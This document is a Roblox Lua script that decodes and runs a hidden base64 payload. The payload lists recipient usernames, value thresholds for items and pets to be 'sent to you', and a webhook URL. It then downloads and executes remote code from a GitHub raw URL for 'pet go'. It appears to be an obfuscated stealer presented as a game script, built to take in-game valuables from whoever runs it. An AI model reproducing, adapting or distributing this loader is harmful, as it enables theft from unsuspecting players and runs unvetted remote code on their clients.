
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJhbG1hcmlzMTIzNDUiLAogICAgImFsbWFyaXMxMjM0NSIsCiAgICAiYWxtYXJpczEyMzQ1IiwKfQptaW5fcmFwID0gMTAwMDAgLS0gbWluaW11bSByYXAgb2YgZWFjaCBpdGVtIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQptaW5fY2hhbmNlID0gMTAwMCAtLSBtaW5pbXVtIGNoYW5jZSBvZiBwZXRzIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQp3ZWJob29rID0gImh0dHBzOi8vYXV0aC5wbGF0b2Jvb3N0LmNvbS9pUGQyWmdTcFM1WXRxcEdvMlllRGtkaTVzVGdkbnF0eDVJQnpuVUtvdGo2ZTc5NyUyRmNSWUlRQXFPcWhWT2U1c1o4NW5FdE11akFqUnIwekIzM3pVZlU5S2RSRFRKNHFpQTBFa2dNSnZsbHdidDVnSGRGcHpVMFZZSVVtT1FhbkdwenVjaFpnakZhV1h0YzAyNVJMcEk1QWhvOUklMkZoQiUyRmxRNiUyRlpTQmUwOEZkN0lNT0RqSW1lMjhjTXBrWnJpeVZ1alhHeGNhM1lOdXJ6ZGY0JTJCbm9QWTUyV3ZEM3RwcFJObSUyQm1VdVMwJTJGQ1VXZzdhekR6Z0E1SkhmYUtsTzlvMWlxTzByWFU2b2p1dGtPQ2x0d1NqUExsSmJJSU5QN1YzcWVlcGxPVVRwR3dod0s2MldyMHAzcVF2bHZEeU44VkpRQ0lPJTJGaCUyRktrS1Q5ejZZZFpvQ3FSdGNaVzFwU3l1Mk56d0NmMnlGaVZEMmUwUjgzUWJmbG54aDRKeSUyQnZnVjczbSUyQnVLSDJJNFglMkYyT1JpRFY5YjZMMTVLRjk1JTJCMnBvSWJabnFaNGdqM3NMWmp6WHQlMkZzRFlaMjVJRWVpaSUyRjF1bnd5RjMzMVMlMkJ4JTJCU2dod00lMkY3VVd2MkpuWGhkRTdldXolMkZLdUZaYWx2ZTNqdTJrUG1jTE9XWTRWeWxKRXdTR0tKeTlzJTJGMm9YcCUyQnNjbk1tcXRndHBnYTJkemRQeWRrJTNEIgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9wZXQlMjBnbyIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()